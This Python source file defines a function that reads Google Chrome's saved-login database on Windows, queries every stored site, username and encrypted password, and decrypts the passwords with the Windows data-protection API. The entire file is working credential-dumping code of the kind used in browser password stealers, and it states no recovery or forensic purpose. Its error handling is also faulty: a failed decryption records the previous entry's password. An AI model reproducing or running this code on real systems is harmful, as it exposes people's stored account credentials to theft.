"""
Author: Tomer Perets
Date: 27.6.18
"""

import os
import win32crypt
import usefull_things as ut


def get_chrome_saved_password(chrome_path):
    """
    decrypt the encrypted password in the chrome database.
    its accessing the chrome password file database and uses an sql query to get the data.
    if error occurs the function returns an array according to the error system that is defined in the error.py file.
    :param chrome_path: the chrome databases path
    :return: list of the passwords [[website, username, password]...]
    :return2: error number - ['err', error_number, error_info]
    """
    data_path = os.path.join(chrome_path, 'Login Data')
    if not ut.file_exists(data_path):
        return ['err', 0, data_path]
    cursor = ut.connect_to_sqlite3_db(data_path)
    select_statement1 = 'SELECT action_url, username_value, password_value FROM logins'
    data = ut.execute_sql(cursor, select_statement1)
    if len(data) > 0:
        list_of_passwords = []
        password = ""
        for result in data:
            try:
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]  # Decrypt the password
                list_of_passwords.append((result[0], result[1], password))
            except Exception:
                list_of_passwords.append((result[0], result[1], password))
        return list_of_passwords
    else:
        return ['err', 1, select_statement1]
